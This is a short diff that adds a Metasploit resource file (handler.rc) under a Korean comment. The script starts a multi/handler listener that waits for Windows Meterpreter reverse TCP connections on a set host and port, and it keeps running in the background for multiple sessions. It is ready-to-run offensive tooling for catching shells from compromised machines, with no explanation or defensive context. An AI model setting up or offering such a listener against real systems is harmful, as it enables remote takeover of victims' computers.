@@ -1,0 +1,7 @@
+# handler.rc 파일 코드
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.5.6
+set LPORT 4444
+set exitonsession false
+exploit -j
